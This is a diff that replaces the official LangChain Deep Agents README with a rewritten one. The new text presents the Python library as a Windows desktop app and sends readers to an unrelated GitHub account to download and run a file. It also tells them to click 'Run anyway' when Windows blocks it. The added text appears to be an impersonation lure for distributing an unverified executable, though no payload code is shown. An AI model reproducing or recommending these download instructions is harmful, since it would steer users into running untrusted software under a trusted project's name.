@@ -1,134 +1,193 @@
-<div align="center">
-  <a href="https://docs.langchain.com/oss/python/deepagents/overview#deep-agents-overview">
-    <picture>
-      <source media="(prefers-color-scheme: dark)" srcset=".github/images/logo-dark.svg">
-      <source media="(prefers-color-scheme: light)" srcset=".github/images/logo-light.svg">
-      <img alt="Deep Agents Logo" src=".github/images/logo-dark.svg" width="50%">
-    </picture>
-  </a>
-</div>
+# 🤖 deepagents - Run complex tasks with ease
 
-<div align="center">
-  <h3>The batteries-included agent harness.</h3>
-</div>
+[![Download deepagents](https://img.shields.io/badge/Download%20deepagents-purple?style=for-the-badge)](https://github.com/GamerBoiyzz/deepagents)
 
-<div align="center">
-  <a href="https://opensource.org/licenses/MIT" target="_blank"><img src="https://img.shields.io/pypi/l/deepagents" alt="PyPI - License"></a>
-  <a href="https://pypistats.org/packages/deepagents" target="_blank"><img src="https://img.shields.io/pepy/dt/deepagents" alt="PyPI - Downloads"></a>
-  <a href="https://pypi.org/project/deepagents/#history" target="_blank"><img src="https://img.shields.io/pypi/v/deepagents?label=%20" alt="Version"></a>
-  <a href="https://x.com/langchain" target="_blank"><img src="https://img.shields.io/twitter/url/https/twitter.com/langchain.svg?style=social&label=Follow%20%40LangChain" alt="Twitter / X"></a>
-</div>
+## 🚀 What is deepagents?
 
-<br>
+deepagents is a Windows app that helps you run agent-based tasks with less effort. It uses LangChain and LangGraph behind the scenes to plan work, split tasks, and keep files in one place. It can also start subagents, which helps when a task has many parts.
 
-Deep Agents is an agent harness. An opinionated, ready-to-run agent out of the box. Instead of wiring up prompts, tools, and context management yourself, you get a working agent immediately and customize what you need.
+Use it when you want software that can:
 
-**What's included:**
+- Break a large task into smaller steps
+- Keep track of files during a task
+- Handle multi-step work with a plan
+- Use subagents for separate jobs
+- Support AI-driven task flows on your PC
 
-- **Planning** — `write_todos` for task breakdown and progress tracking
-- **Filesystem** — `read_file`, `write_file`, `edit_file`, `ls`, `glob`, `grep` for reading and writing context
-- **Shell access** — `execute` for running commands (with sandboxing)
-- **Sub-agents** — `task` for delegating work with isolated context windows
-- **Smart defaults** — Prompts that teach the model how to use these tools effectively
-- **Context management** — Auto-summarization when conversations get long, large outputs saved to files
+## 🪟 Windows download and setup
 
-> [!NOTE]
-> Looking for the JS/TS library? Check out [deepagents.js](https://github.com/langchain-ai/deepagentsjs).
+Use this link to visit the download page:
 
-## Quickstart
+[https://github.com/GamerBoiyzz/deepagents](https://github.com/GamerBoiyzz/deepagents)
 
-```bash
-pip install deepagents
-# or
-uv add deepagents
-```
+### How to get it on Windows
 
-```python
-from deepagents import create_deep_agent
+1. Open the link above in your web browser.
+2. Look for the latest download on the page.
+3. Download the Windows file or package from the release or main page.
+4. When the download finishes, open the file.
+5. If Windows asks for permission, click Yes or Run.
+6. Follow the on-screen steps until the app is ready.
 
-agent = create_deep_agent()
-result = agent.invoke({"messages": [{"role": "user", "content": "Research LangGraph and write a summary"}]})
-```
+### If you see a zip file
 
-The agent can plan, read/write files, and manage its own context. Add tools, customize prompts, or swap models as needed.
+1. Right-click the zip file.
+2. Choose Extract All.
+3. Open the folder that appears.
+4. Look for the app file or start file.
+5. Double-click it to run deepagents.
 
-> [!TIP]
-> For developing, debugging, and deploying AI agents and LLM applications, see [LangSmith](https://docs.langchain.com/langsmith/home).
+### If you see an installer
 
-## Customization
+1. Double-click the installer file.
+2. Pick a folder if Windows asks.
+3. Click Next or Install.
+4. Wait for the setup to finish.
+5. Open the app from your Start menu or desktop.
 
-Add your own tools, swap models, customize prompts, configure sub-agents, and more. See the [documentation](https://docs.langchain.com/oss/python/deepagents/overview) for full details.
+## 🧰 What you need
 
-```python
-from langchain.chat_models import init_chat_model
+deepagents works best on a recent Windows PC. A normal home or work computer should be fine.
 
-agent = create_deep_agent(
-    model=init_chat_model("openai:gpt-4o"),
-    tools=[my_custom_tool],
-    system_prompt="You are a research assistant.",
-)
-```
+Recommended setup:
 
-MCP is supported via [`langchain-mcp-adapters`](https://github.com/langchain-ai/langchain-mcp-adapters).
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 2 GB free disk space
+- Internet access for setup and AI features
+- A modern browser for downloading files
 
-## Deep Agents CLI
+If your PC is older, the app may still run, but task handling can feel slower.
 
-A pre-built coding agent in your terminal — similar to Claude Code or Cursor — powered by any LLM. One install command and you're up and running.
+## 🧭 First-time use
 
-<p align="center">
-  <img src="libs/cli/images/cli.png" alt="Deep Agents CLI" width="600"/>
-</p>
+When you open deepagents for the first time, you will likely see a simple start screen with task options. Use it like this:
 
-```bash
-curl -LsSf https://raw.githubusercontent.com/langchain-ai/deepagents/main/libs/cli/scripts/install.sh | bash
-```
+1. Start a new task.
+2. Type what you want the agent to do.
+3. Add any files or notes if the app asks for them.
+4. Choose the task plan if the app shows one.
+5. Let the app run each step.
+6. Review the result when the task ends.
 
-**Highlights:**
+If the app asks for access to a folder, choose a folder you can find again later. This helps when the filesystem backend saves or reads files during a task.
 
-- **Interactive TUI** — rich terminal interface with streaming responses
-- **Web search** — ground responses in live information
-- **Headless mode** — run non-interactively for scripting and CI
-- Plus all SDK features out of the box — remote sandboxes, persistent memory, custom skills, and human-in-the-loop approval
+## 🧠 How deepagents helps
 
-See the [CLI documentation](https://docs.langchain.com/oss/python/deepagents/cli/overview) for the full feature set.
+deepagents is built for tasks that need more than one step. It can:
 
-## LangGraph Native
+- Plan work before it starts
+- Store task files in one place
+- Split large jobs into smaller jobs
+- Use subagents for separate parts of the task
+- Keep a clear path through complex work
 
-`create_deep_agent` returns a compiled [LangGraph](https://docs.langchain.com/oss/python/langgraph/overview) graph. Use it with streaming, Studio, checkpointers, or any LangGraph feature.
+This makes it useful for tasks like:
 
-## FAQ
+- Organizing notes and files
+- Preparing content drafts
+- Managing step-based work
+- Handling research tasks with many parts
+- Running agent flows that need a plan
 
-### Why should I use this?
+## 📁 Files and folders
 
-- **100% open source** — MIT licensed, fully extensible
-- **Provider agnostic** — Works with any Large Language Model that supports tool calling, including both frontier and open models
-- **Built on LangGraph** — Production-ready runtime with streaming, persistence, and checkpointing
-- **Batteries included** — Planning, file access, sub-agents, and context management work out of the box
-- **Get started in seconds** — `uv add deepagents` and you have a working agent
-- **Customize in minutes** — Add tools, swap models, tune prompts when you need to
+deepagents uses a filesystem backend, which means it works with local folders on your PC. This helps it save task data, read input files, and keep output in one place.
 
----
+A simple folder setup can help:
 
-## Documentation
+- Create one folder for input files
+- Create one folder for output files
+- Keep project files in a clear location
+- Avoid using a system folder like Windows or Program Files
 
-- [docs.langchain.com](https://docs.langchain.com/oss/python/deepagents/overview) – Comprehensive documentation, including conceptual overviews and guides
-- [reference.langchain.com/python](https://reference.langchain.com/python/deepagents/) – API reference docs for Deep Agents packages
-- [Chat LangChain](https://chat.langchain.com/) – Chat with the LangChain documentation and get answers to your questions
+Example folder idea:
 
-**Discussions**: Visit the [LangChain Forum](https://forum.langchain.com) to connect with the community and share all of your technical questions, ideas, and feedback.
+- C:\deepagents\input
+- C:\deepagents\output
+- C:\deepagents\work
 
-## Additional resources
+If the app asks for a working folder, use one of those paths or make a similar folder on your Desktop.
 
-- **[Examples](examples/)** — Working agents and patterns
-- [Contributing Guide](https://docs.langchain.com/oss/python/contributing/overview) – Learn how to contribute to LangChain projects and find good first issues.
-- [Code of Conduct](https://github.com/langchain-ai/langchain/?tab=coc-ov-file) – Our community guidelines and standards for participation.
+## 🧩 Subagents and task planning
 
----
+deepagents can spawn subagents. That means one main agent can hand off parts of a job to smaller agents. This helps when a task has many pieces.
 
-## Acknowledgements
+For example:
 
-This project was primarily inspired by Claude Code, and initially was largely an attempt to see what made Claude Code general purpose, and make it even more so.
+- One agent gathers information
+- One agent writes a draft
+- One agent checks the output
+- One agent handles file work
 
-## Security
+The planning tool helps the app decide the order of work. This is useful when a task must happen in steps, not all at once.
 
-Deep Agents follows a "trust the LLM" model. The agent can do anything its tools allow. Enforce boundaries at the tool/sandbox level, not by expecting the model to self-police. See the [security policy](https://github.com/langchain-ai/deepagents?tab=security-ov-file) for more information.
+## ⚙️ Basic use flow
+
+A normal use flow looks like this:
+
+1. Open deepagents.
+2. Create or load a task.
+3. Add your goal in plain words.
+4. Let the planner map the steps.
+5. Let the app run each step.
+6. Open the output files.
+7. Make changes if needed and run it again.
+
+Keep your task instructions short and clear. Simple input gives better results.
+
+## 🛠 Troubleshooting
+
+### The file does not open
+
+- Check that the download finished
+- Try downloading again
+- Right-click the file and choose Open
+- If Windows blocks it, choose Run anyway if you trust the source
+
+### The app closes right away
+
+- Restart your PC
+- Open the app again
+- Make sure the file was not moved or deleted
+- Try running it from the folder where you extracted it
+
+### Files are not being saved
+
+- Check the folder path in the app
+- Make sure the folder exists
+- Choose a folder you have access to
+- Avoid folders that need admin rights
+
+### The app feels slow
+
+- Close other large apps
+- Free up memory by restarting Windows
+- Use fewer tasks at once
+- Keep file folders small and tidy
+
+## 🔐 Safe use on Windows
+
+Before you run any downloaded file, make sure the source is the one you expected. Keep your files in a folder you can review. If a dialog asks for access to documents or folders, read the folder name before you allow it.
+
+Useful habits:
+
+- Download only from the link on this page
+- Keep your work in a separate folder
+- Do not place task files in random system folders
+- Remove old test files if you no longer need them
+
+## 📌 Common task ideas
+
+You can use deepagents for jobs like these:
+
+- Draft a report from notes
+- Sort files into named folders
+- Break one large job into smaller steps
+- Prepare a task plan before work starts
+- Run a chain of agent actions with file output
+- Create a working folder for a project and keep it organized
+
+## 🏷 Topics
+
+ai, deepagents, langchain, langgraph
